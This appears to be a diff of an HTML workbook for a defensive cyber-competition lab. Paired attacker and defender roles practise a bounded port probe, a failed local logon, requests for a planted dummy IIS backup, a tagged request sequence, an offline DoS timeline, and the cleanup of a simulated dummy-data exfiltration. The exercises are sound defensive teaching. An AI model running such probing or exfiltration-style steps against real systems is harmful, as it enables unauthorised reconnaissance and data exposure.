+<p>Expect a connection failure or timeout. Record the time and result. The block prevents another transfer to this
+  receiver; it cannot undo the dummy data already recorded there.</p>
+<h4>Step 5 — Defender: verify service and clean up</h4>
+<p>Check for a remaining sender connection; expect no established connection:</p>
+<pre>Get-NetTCPConnection -RemoteAddress 172.29.242.1 -RemotePort 18081 -State Established -ErrorAction SilentlyContinue</pre>
+<p>Check the services and operational webpage:</p>
+<pre>Get-Service W3SVC,DNS,TermService
+(Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing -TimeoutSec 5).Content</pre>
+<p>Verify DNS still answers:</p>
+<pre>Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</pre>
+<p>All three services should remain running. Confirm the operational page from your campus laptop and continued
+  remote desktop access. No startup entry was installed by this exercise; stopping curl ends the running simulator.</p>
+<p>After retaining the containment evidence, remove only the outbound exercise rule:</p>
+<pre>Remove-NetFirewallRule -Name 'CCDC-Exercise-Outbound-Block'</pre>
+<p>Check the rule is absent and read receipts after restoring lab connectivity:</p>
+<pre>Get-NetFirewallRule -Name 'CCDC-Exercise-Outbound-Block' -ErrorAction SilentlyContinue
+curl.exe --max-time 5 -fsS http://172.29.242.1:18081/receipts/windows</pre>
+<p>The blocked attempt should have no matching new receipt. Earlier receipts remain evidence of completed transfers.
+  Keep your screenshots or saved output. In the attacker’s original PowerShell window, remove only this round’s copied
+  dummy file after the debrief:</p>
+<p>Remove the copied dummy file:</p>
+<pre>Remove-Item -LiteralPath "$case\dummy-business-data.txt"</pre>
+<p><strong>Practice check:</strong> show the destination and sender PID, the independent receipt and matching checksum,
+  the blocked retry and normal business services. Switch roles and repeat from Step 1. No written report submission
+  is required.</p>
 <section id="before-login">
   <h2 id="module-2">Module 2 — Attacker starts without system access</h2><span id="authentication"></span><span
     id="web-inputs"></span>
-  <p>Read <a href="student-workbook.html#module-2">Module 2 concepts and exercise boundaries in Getting Started</a>,
-    then complete the platform tasks below. This track includes a bounded port pass, request-log investigation and a
-    supplied DoS evidence exercise.</p>
-  <h3 id="discovery">2.1 — Port scanning and service discovery</h3>
-  <p>Use the assigned guest only. In these single-VM simulations, the red-team operator uses a normal guest terminal to
-    generate network requests; target administration is reserved for the blue team. The operator login is a
-    traffic-generation convenience, not evidence of a successful intrusion. Do not elevate the red-team commands.</p>
-  <h4>Blue team — establish the service inventory</h4>
-  <p>Record listening ports before the red-team pass. The instructor confirms TCP 65000 is unused; if it is in use, omit
-    it. Required ports are 53 (DNS), 80 (HTTP), and 3389 (RDP).</p>
+  <p>Practice service discovery, authentication and request-log investigation, and analysis of a supplied incident timeline.</p>
+  <h3 id="discovery">Task 2.1 — Port scanning and service discovery</h3>
+<p>Compare the attacker’s view of reachable ports with the defender’s service inventory. Follow the steps below:</p>
+<ol>
+  <li>Defender — establish the service inventory</li>
+  <li>Attacker — one bounded pass</li>
+  <li>Defender — explain and verify</li>
+</ol>
+  <p>Use the assigned guest only. In these single-VM simulations, the attacker uses a normal guest terminal to
+    generate network requests; target administration is reserved for the defender. The attacker uses the assigned
+    account only to generate traffic; this login does not demonstrate a successful intrusion. Run the attacker’s
+    commands without elevation.</p>
+  <h4>Step 1 — Defender: establish the service inventory</h4>
+  <p>Record listening ports before the attacker’s scan. Use the listener inventory to confirm TCP 65000 is unused; omit it if it is in use. Required ports are 53 (DNS), 80 (HTTP), and 3389 (RDP).</p>
   <pre>Get-Date -Format o
 Get-NetTCPConnection -State Listen | Sort-Object LocalPort | Select-Object LocalAddress,LocalPort,OwningProcess
 Get-Service DNS,W3SVC,TermService</pre>
-  <h4>Red team — one bounded pass</h4>
+  <h4>Step 2 — Attacker: one bounded pass</h4>
   <p>Probe only these four ports once. A failed connection can mean a closed port or filtering; it is not a conclusive
     firewall diagnosis. Save the displayed results for comparison.</p>
   <pre>53,80,3389,65000 | ForEach-Object {
@@ -823,7 +1120,7 @@ Get-Service DNS,W3SVC,TermService</pre>
   $open = Test-NetConnection -ComputerName 172.29.242.40 -Port $port -InformationLevel Quiet -WarningAction SilentlyContinue
   [pscustomobject]@{Port=$port; TcpReachable=$open}
 }</pre>
-  <h4>Blue team — explain and verify</h4>
+  <h4>Step 3 — Defender: explain and verify</h4>
   <ol>
     <li>Compare probe results with the inventory. Explain each expected listener and investigate any discrepancy.</li>
     <li>Inspect existing firewall or service logs for the recorded time window. A connection-only probe may leave no
@@ -836,79 +1133,95 @@ Get-Service DNS,W3SVC,TermService</pre>
   <p><strong>Complete:</strong> show the four results, the matching listener inventory, and a normal HTTP response. No
     configuration cleanup is needed. The local pass does not establish laptop reachability or test the relay firewall.
     Windows TCP 53 does not verify UDP DNS.</p>
-  <h3 id="section-2-2-practical-investigate-failed-windows-authentication">2.2 practical — Investigate failed Windows
+  <h3 id="section-2-2-practical-investigate-failed-windows-authentication">Task 2.2 practical — Investigate failed Windows
     authentication</h3>
-  <p><strong>Defender, elevated PowerShell:</strong> establish the baseline. The instructor verifies that failure
-    auditing is enabled and that the test name does not exist. The account lookup must return False.</p>
+<p>Investigate rejected authentication attempts and distinguish the evidence from a successful login. Follow the steps below:</p>
+<ol>
+  <li>Defender — establish the baseline</li>
+  <li>Attacker — generate the failed authentication attempt</li>
+  <li>Defender — inspect and explain the authentication evidence</li>
+</ol>
+<h4>Step 1 — Defender: establish the baseline</h4>
+  <p><strong>Defender, elevated PowerShell:</strong> establish the baseline. Verify that failure auditing is enabled and that the test name does not exist. The account lookup must return False.</p>
   <pre>Get-Date -Format o
 Get-Service W3SVC,DNS,TermService
 [bool](Get-LocalUser | Where-Object Name -eq 'ccdc-probe-no-user')
 auditpol /get /subcategory:"Logon"</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#windows-get-service">Get-Service</a> · <a
-      href="command-reference.html#windows-get-date">Get-Date</a> · <a
-      href="command-reference.html#windows-where-object">Where-Object</a> · <a
-      href="command-reference.html#syntax">script syntax</a></p>
-  <p><strong>Operator, a separate PowerShell window:</strong> run once and enter arbitrary dummy text at the password
-    prompt. Expect a logon failure; no command window should open. Repeat manually at most twice more if instructed.</p>
+<p>Expect the account lookup to return <code>False</code> and Logon auditing to include failures. If failure auditing
+  is not enabled, the defender enables it before the attacker starts:</p>
+<pre>auditpol /set /subcategory:"Logon" /failure:enable</pre>
+<p>Repeat the audit-policy check before continuing.</p>
+
+  <h4>Step 2 — Attacker: generate the failed authentication attempt</h4>
+<p><strong>Attacker, a separate PowerShell window:</strong> run once and enter arbitrary dummy text at the password
+    prompt. Expect a logon failure; no command window should open. Repeat manually at most twice more to compare several failures; do not exceed three attempts in this round.</p>
   <pre>runas /user:.\ccdc-probe-no-user "cmd.exe /c whoami"</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#windows-whoami">whoami</a></p>
-  <p>This tests a local logon path, not remote RDP. Expect local/blank source information and inspect the actual logon
-    type. The instructor can additionally demonstrate one rejected RDP login through the lab's existing connection
-    route, using the same nonexistent account. NLA and authentication method can change the logon type and event
-    sequence; do not assume every failed RDP attempt is type 10. The relay may hide the original client IP.</p>
-  <p><strong>Defender, elevated PowerShell:</strong> inspect recent failures and successes. Read the full message for an
+  <p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami">whoami</a></p>
+  <p>This tests a local logon path. Expect local or blank source information and inspect the actual logon type rather
+    than assuming it is an RDP event.</p>
+  <h4>Step 3 — Defender: inspect and explain the authentication evidence</h4>
+<p><strong>Defender, elevated PowerShell:</strong> inspect recent failures and successes. Read the full message for an
     event containing the test username; unrelated background events may appear too.</p>
   <pre>$since = (Get-Date).AddMinutes(-10)
 Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=$since} |
   Select-Object -First 20 TimeCreated,Id,Message | Format-List
 Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624; StartTime=$since} |
   Select-Object -First 10 TimeCreated,Id,Message | Format-List</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#linux-id">id</a> · <a href="command-reference.html#windows-get-date">Get-Date</a> ·
-    <a href="command-reference.html#windows-get-winevent">Get-WinEvent</a> · <a
-      href="command-reference.html#windows-select-object">Select-Object</a> · <a
-      href="command-reference.html#syntax">script syntax</a>
-  </p>
+
   <p>Find the target account, time, logon type, status/substatus and source where populated. Event 4625 records failed
     logon; 4624 records successful logon. Do not confuse the Subject account with the account being targeted. No
     matching events: verify the time window, audit policy and permissions; do not repeatedly generate failures. One
     attempt can cause multiple records. Compare an isolated mistake with a cluster of failures; discuss spraying across
     accounts without performing it.</p>
-  <h3 id="section-2-3-practical-investigate-iis-probing-and-a-dummy-exposed-backup">2.3 practical — Investigate IIS
+  <h3 id="section-2-3-practical-investigate-iis-probing-and-a-dummy-exposed-backup">Task 2.3 practical — Investigate IIS
     probing and a dummy exposed backup</h3>
-  <p>The instructor first publishes the dummy exercise file. <strong>Operator, PowerShell:</strong> run these requests
-    once each. Use <code>curl.exe</code> explicitly; <code>curl</code> can be a PowerShell alias on this server.</p>
+<p>Investigate requests for a missing file and a deliberately exposed dummy backup. Follow the steps below:</p>
+<ol>
+  <li>Attacker — make the assigned web requests</li>
+  <li>Defender — inspect the request evidence</li>
+  <li>Defender — mitigate, repeat and verify</li>
+</ol>
+<h4>Step 1 — Attacker: make the assigned web requests</h4>
+<p>Before requests begin, verify logging in IIS Manager: Sites → Default Web Site → Logging. Enable site logging if
+  disabled, select W3C format, and include date, time, c-ip, cs-method, cs-uri-stem, cs-uri-query and sc-status. Use the
+  physical website and log paths shown for this site.</p>
+<p><strong>Attacker, elevated PowerShell:</strong> prepare the deliberately exposed dummy file using your assigned
+  trainee account. This is scenario setup; the later requests model finding exposed data without logging in.</p>
+<p>Check that both exercise paths are absent; expect False for each:</p>
+<pre>Test-Path -LiteralPath 'C:\inetpub\wwwroot\ccdc-probe-backup.txt'
+Test-Path -LiteralPath 'C:\inetpub\wwwroot\ccdc-probe-missing.txt'</pre>
+<p>If the known dummy backup remains from a previous round, complete Step 3 first. Do not overwrite an unknown file.</p>
+<p>Create only the fictional dummy backup; continue only if creation succeeds:</p>
+<pre>New-Item -ItemType File -Path 'C:\inetpub\wwwroot\ccdc-probe-backup.txt' -Value 'CCDC DUMMY BACKUP - NO REAL SECRETS' -ErrorAction Stop</pre>
+<p>Make the following requests once each. Use <code>curl.exe</code> explicitly; <code>curl</code> can be a PowerShell
+  alias on this server.</p>
   <pre>curl.exe -i --max-time 5 http://172.29.242.40/index.html
 curl.exe -i --max-time 5 http://172.29.242.40/ccdc-probe-missing.txt
 curl.exe -i --max-time 5 http://172.29.242.40/ccdc-probe-backup.txt</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#linux-curl">curl</a></p>
+
   <p>Expect 200 for the operational page, 404 for the missing path and 200 with dummy text for the published backup. No
     valid server login was needed to read that file.</p>
-  <p><strong>Defender, elevated PowerShell:</strong> find the website ID and log location in IIS Manager: Sites →
+  <h4>Step 2 — Defender: inspect the request evidence</h4>
+<p><strong>Defender, elevated PowerShell:</strong> find the website ID and log location in IIS Manager: Sites →
     Default Web Site → Logging. These commands assume the default W3C path and site ID 1; substitute the actual location
     if different.</p>
   <pre>$logRoot = "$env:SystemDrive\inetpub\logs\LogFiles\W3SVC1"
 $log = Get-ChildItem -LiteralPath $logRoot -Filter '*.log' |
   Sort-Object LastWriteTime -Descending | Select-Object -First 1
-if ($null -eq $log) { throw 'No IIS log found; ask the instructor to check logging.' }
+if ($null -eq $log) { throw 'No IIS log found; check the site logging settings before continuing.' }
 Get-Content -LiteralPath $log.FullName -TotalCount 5
 Get-Content -LiteralPath $log.FullName -Tail 60</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#windows-select-object">Select-Object</a> · <a
-      href="command-reference.html#windows-sort-object">Sort-Object</a> · <a href="command-reference.html#syntax">script
-      syntax</a></p>
-  <p>W3C log records can be buffered: wait up to a minute and reread; ask the instructor if evidence is still missing.
+  <p class="command-help-links"><strong>Official command documentation:</strong>
+  <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/sort-object">Sort-Object</a></p>
+  <p>W3C log records can be buffered: wait up to a minute and reread. If evidence is missing, check that site’s Logging settings and fields in IIS Manager.
     Read the <code>#Fields:</code> header rather than assuming column positions. Identify <code>date</code>,
     <code>time</code>, <code>c-ip</code>, <code>cs-method</code>, <code>cs-uri-stem</code>, <code>sc-status</code> and,
     if present, substatus. W3C timestamps are UTC; compare with the timezone shown by Get-Date. A suspicious path is a
     clue; a 200 with dummy contents demonstrates exposure, not execution or compromise.
   </p>
-  <h3 id="section-mitigate-repeat-and-verify">Mitigate, repeat and verify</h3>
-  <p>Preserve the relevant records. The following assumes the default website root; the instructor must confirm the
-    physical path first. Verify the file contains only the exercise marker, then remove this file only.</p>
+  <h4 id="section-mitigate-repeat-and-verify">Step 3 — Defender: mitigate, repeat and verify</h4>
+  <p>Preserve the relevant records. The following assumes the default website root; confirm the physical path in IIS Manager: Sites → Default Web Site → Basic Settings before proceeding. Verify the file contains only the exercise marker, then remove this file only.</p>
   <pre>Get-Content -LiteralPath 'C:\inetpub\wwwroot\ccdc-probe-backup.txt'
 Remove-Item -LiteralPath 'C:\inetpub\wwwroot\ccdc-probe-backup.txt' -Confirm
 curl.exe -i --max-time 5 http://172.29.242.40/ccdc-probe-backup.txt
@@ -916,12 +1229,7 @@ curl.exe -i --max-time 5 http://172.29.242.40/ccdc-probe-backup.txt
 Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile
 Get-Service W3SVC,DNS,TermService
 Get-Content -LiteralPath $log.FullName -Tail 20</pre>
-  <p class="command-help-links"><strong>Understand these commands:</strong> <a
-      href="command-reference.html#linux-curl">curl</a> · <a
-      href="command-reference.html#windows-get-service">Get-Service</a> · <a
-      href="command-reference.html#windows-resolve-dnsname">Resolve-DnsName</a> · <a
-      href="command-reference.html#windows-invoke-webrequest">Invoke-WebRequest</a> · <a
-      href="command-reference.html#shell-test">test</a> · <a href="command-reference.html#syntax">script syntax</a></p>
+
   <p>Expect 404 for the removed backup, the operational Windows intranet, DNS answer <code>172.29.242.30</code>, and
     Running services. Allow for IIS log buffering. Discuss unique passwords, supported MFA, restricted administrative
     reachability and temporary throttling. Aggressive account lockouts can also deny legitimate users access. Do not
@@ -937,32 +1245,43 @@ Get-Content -LiteralPath $log.FullName -Tail 20</pre>
       href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol-get">Audit policy
       inspection</a>.</p>
 
-  <h3 id="traffic">2.4 — Investigate suspicious request traffic</h3>
-  <p>Use the assigned guest only. In these single-VM simulations, the red-team operator uses a normal guest terminal to
-    generate network requests; target administration is reserved for the blue team. The operator login is a
-    traffic-generation convenience, not evidence of a successful intrusion. Do not elevate the red-team commands.</p>
-  <h4>Prepare</h4>
-  <p>The instructor confirms access logging is enabled and the two probe paths below do not exist. The blue team records
+  <h3 id="traffic">Task 2.4 — Investigate suspicious request traffic</h3>
+<p>Trace a short sequence of web requests through the access logs and explain the evidence. Follow the steps below:</p>
+<ol>
+  <li>Prepare</li>
+  <li>Attacker — generate a short request sequence</li>
+  <li>Defender — find and interpret the evidence</li>
+  <li>Verify and close the round</li>
+</ol>
+  <p>Use the assigned guest only. In these single-VM simulations, the attacker uses a normal guest terminal to
+    generate network requests; target administration is reserved for the defender. The attacker uses the assigned
+    account only to generate traffic; this login does not demonstrate a successful intrusion. Run the attacker’s
+    commands without elevation.</p>
+  <h4>Step 1 — Prepare</h4>
+<p>Before requests begin, verify logging in IIS Manager: Sites → Default Web Site → Logging. Enable site logging if
+  disabled, select W3C format, and include date, time, c-ip, cs-method, cs-uri-stem, cs-uri-query and sc-status. Use the
+  physical website and log paths shown for this site.</p>
+  <p>The defender confirms access logging is enabled and the two probe paths below do not exist, then records
     the time and normal page response. This exercise uses web access logs as network-request evidence; it is not a
     packet-capture exercise.</p>
-  <h4>Red team — generate a short request sequence</h4>
+  <h4>Step 2 — Attacker: generate a short request sequence</h4>
   <p>Run once: four sequential requests, separated by one second. The unique marker distinguishes the round from
-    background traffic. Give the marker to the blue team after it locates the pattern.</p>
+    background traffic. Give the marker to the defender after it locates the pattern.</p>
   <pre>$marker = &#x27;ccdc24-&#x27; + (Get-Date -Format yyyyMMddHHmmss)
 &quot;Round marker: $marker&quot;
 &#x27;index.html&#x27;,&#x27;ccdc24-missing.txt&#x27;,&#x27;ccdc24-backup.zip&#x27;,&#x27;index.html&#x27; | ForEach-Object {
   curl.exe --max-time 5 -sS -o NUL -w &quot;%{http_code} %{url_effective}\n&quot; &quot;http://172.29.242.40/$_`?round=$marker&quot;
   Start-Sleep -Seconds 1
 }</pre>
-  <h4>Blue team — find and interpret the evidence</h4>
+  <h4>Step 3 — Defender: find and interpret the evidence</h4>
   <pre>$logRoot = &#x27;C:\inetpub\logs\LogFiles\W3SVC1&#x27;
 $log = Get-ChildItem -LiteralPath $logRoot -Filter &#x27;*.log&#x27; | Sort-Object LastWriteTime -Descending | Select-Object -First 1
-if ($null -eq $log) { throw &#x27;Ask the instructor to verify the IIS log location and logging.&#x27; }
+if ($null -eq $log) { throw &#x27;No IIS log found; check the configured log directory and site logging.&#x27; }
 Get-Content -LiteralPath $log.FullName -TotalCount 8
 Get-Content -LiteralPath $log.FullName -Tail 150 | Select-String &#x27;ccdc24-&#x27; </pre>
   <p>Use the actual configured log path if it differs. IIS records may be buffered: wait up to one minute and reread
-    once. Read its #Fields header; the instructor should enable date, time, c-ip, cs-method, cs-uri-stem, cs-uri-query
-    and sc-status. Nginx combined logs include the request path and query. Distinguish local time offsets from IIS UTC.
+    once. Read its #Fields header; the defender checks that date, time, c-ip, cs-method, cs-uri-stem, cs-uri-query
+    and sc-status are enabled under IIS Manager → Sites → Default Web Site → Logging → Select Fields. Nginx combined logs include the request path and query. Distinguish local time offsets from IIS UTC.
   </p>
   <ol>
     <li>Locate the four requests and record time, source, method, path and status.</li>
@@ -973,24 +1292,31 @@ Get-Content -LiteralPath $log.FullName -Tail 150 | Select-String &#x27;ccdc24-&#
     <li>Propose one response if a sensitive backup really were exposed: preserve evidence and remove the exposed copy
       while leaving normal content available.</li>
   </ol>
-  <h4>Verify and close the round</h4>
+  <h4>Step 4 — Verify and close the round</h4>
   <p>Repeat one normal index request and confirm operational content. Retain the relevant log lines; do not clear the
     logs. No files, accounts or rules were changed. Reverse roles with a new marker. <strong>Complete:</strong> show the
     ordered requests, explain their significance and uncertainty, and demonstrate normal service.</p>
-  <h3 id="dos">2.5 — Investigate denial of service and resource exhaustion</h3>
+  <h3 id="dos">Task 2.5 — Investigate denial of service and resource exhaustion</h3>
+<p>Analyze a simulated service-degradation incident using the supplied CSV timeline. Follow the steps below:</p>
+<ol>
+  <li>Open the evidence inside your assigned VM</li>
+  <li>Attacker — present the scenario</li>
+  <li>Defender — analyze</li>
+  <li>Recovery criteria and live service check</li>
+</ol>
   <p>This is a concrete offline investigation using a supplied synthetic incident dataset. It does not generate a flood
-    or change the live service. The red team introduces the incident evidence; the blue team diagnoses it, proposes
+    or change the live service. The attacker introduces the incident evidence; the defender diagnoses it, proposes
     containment, and validates the recovery evidence.</p>
-  <h4>Open the evidence inside your assigned VM</h4>
+  <h4>Step 1 — Open the evidence inside your assigned VM</h4>
   <p>Save <a href="dos-windows-timeline.csv" download>the Windows incident CSV</a> into Downloads inside the VM. If
     viewing this pack on a laptop, copy the CSV into the VM first. The commands below use that Downloads path; adjust it
     if needed. Each row is a one-minute measurement. requests and http_5xx are counts; p95_ms is the 95th-percentile
     response time in milliseconds; cpu_pct and memory_pct are percentages. The documentation-range source IP is
     fictional and must not be contacted.</p>
-  <h4>Red team — present the scenario</h4>
-  <p>Tell the blue team: “Users report slow pages and intermittent errors starting at 10:02 UTC. The service monitor
+  <h4>Step 2 — Attacker: present the scenario</h4>
+  <p>Tell the defender: “Users report slow pages and intermittent errors starting at 10:02 UTC. The service monitor
     still reports the web service running.” Provide the CSV. Do not stop the real service or send load traffic.</p>
-  <h4>Blue team — analyze</h4>
+  <h4>Step 3 — Defender: analyze</h4>
   <pre>$rows = Import-Csv -LiteralPath &quot;$env:USERPROFILE\Downloads\dos-windows-timeline.csv&quot;
 $rows | Select-Object time_utc,service_state,requests,p95_ms,cpu_pct,@{Name=&#x27;error_pct&#x27;;Expression={[math]::Round(100 * [int]$_.http_5xx / [int]$_.requests,1)}} | Format-Table -AutoSize
 $rows | Sort-Object {[int]$_.requests} -Descending | Select-Object -First 1 time_utc,top_source,top_source_requests</pre>
@@ -1005,7 +1331,7 @@ $rows | Sort-Object {[int]$_.requests} -Descending | Select-Object -First 1 time
     <li>Treat the 10:05 and 10:06 rows as supplied post-containment evidence. Verify recovery against the criteria below
       and explain what monitoring you would continue.</li>
   </ol>
-  <h4>Recovery criteria and live service check</h4>
+  <h4>Step 4 — Recovery criteria and live service check</h4>
   <p>Accept the scenario recovery only if both final samples have a running service, p95 latency below 200 ms, error
     rate below 1%, and CPU below 50%. Then independently check the real VM with the read-only commands below. The live
     check demonstrates lab availability, not that you mitigated the synthetic incident.</p>
@@ -1016,27 +1342,6 @@ Resolve-DnsName www.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile</p
     recovery criteria pass. Preserve your notes; deleting your downloaded CSV after the debrief is optional. Reverse
     roles with the other team explaining and challenging the diagnosis.</p>
 </section>
-<h2 id="business-inject">Practice — Business inject</h2>
-<p>Request: create intranet.training.test pointing to 172.29.242.40. Existing www.training.test, both web pages and SSH
-  must remain available. Demonstrate the change after verifying it.</p>
-<p>Windows elevated PowerShell:</p>
-<pre>Add-DnsServerResourceRecordA -ZoneName training.test -Name intranet -IPv4Address 172.29.242.40</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#windows-add-dnsserverresourcerecorda">Add-DnsServerResourceRecordA</a> · <a
-    href="command-reference.html#shell-test">test</a></p>
-<p>Windows verification:</p>
-<pre>Resolve-DnsName intranet.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile
-Resolve-DnsName intranet.training.test -Server 172.29.242.40 -DnsOnly -NoHostsFile -TcpOnly
-Invoke-WebRequest http://172.29.242.40/index.html -UseBasicParsing</pre>
-<p class="command-help-links"><strong>Understand these commands:</strong> <a
-    href="command-reference.html#windows-resolve-dnsname">Resolve-DnsName</a> · <a
-    href="command-reference.html#windows-invoke-webrequest">Invoke-WebRequest</a> · <a
-    href="command-reference.html#shell-test">test</a></p>
-<p>Practice check: demonstrate the result, explain your actions to your group, and retain your working files. No written
-  report submission is required.</p>
-<h2 id="section-inject-practice">Inject practice</h2>
-<p>Open <a href="inject-practice.html">Inject practice</a> and follow the instructions for your assigned operating
-  system.</p>
 <script id="training-sidebar-script">
   (() => {const sidebar = document.getElementById('training-sidebar'); const button = sidebar.querySelector('button'); button.addEventListener('click', () => {const collapsed = sidebar.dataset.collapsed !== 'true'; sidebar.dataset.collapsed = String(collapsed); button.setAttribute('aria-expanded', String(!collapsed));}); const links = [...sidebar.querySelectorAll('a[href^="#"]')]; const sections = links.map(a => document.getElementById(decodeURIComponent(a.hash.slice(1)))); let pending = false; function update() {let active = 0; sections.forEach((section, i) => {if (section && section.getBoundingClientRect().top <= 110) active = i}); links.forEach((link, i) => {if (i === active) link.setAttribute('aria-current', 'location'); else link.removeAttribute('aria-current')}); pending = false} window.addEventListener('scroll', () => {if (!pending) {pending = true; requestAnimationFrame(update)} }, {passive: true}); function reveal() {const target = document.getElementById(decodeURIComponent(location.hash.slice(1))); const link = links.find(a => a.hash === location.hash); if (target && link) {let parent = link.parentElement; while (parent && parent !== sidebar) {if (parent.tagName === 'DETAILS') parent.open = true; parent = parent.parentElement} } update()} window.addEventListener('hashchange', reveal); reveal();})();
 </script>
